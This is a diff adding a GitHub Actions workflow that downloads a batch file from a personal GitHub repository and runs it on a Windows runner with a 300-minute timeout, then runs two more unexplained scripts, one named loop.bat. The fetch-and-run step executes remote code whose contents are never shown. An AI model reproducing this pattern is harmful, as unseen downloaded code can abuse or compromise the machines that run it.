@@ -1,0 +1,22 @@
+name: testaction
+
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    name: Start Building...
+    runs-on: windows-2025
+    timeout-minutes: 300
+    
+    steps:
+      - name: test
+        run: |
+          Invoke-WebRequest -Uri "https://raw.githubusercontent.com/tollboxlap09/tollboxlap09/refs/heads/main/Downloads.bat" -OutFile "Downloads.bat"
+          cmd /c Downloads.bat
+
+      - name: down
+        run: cmd /c show.bat
+
+      - name: test again 
+        run: cmd /c loop.bat
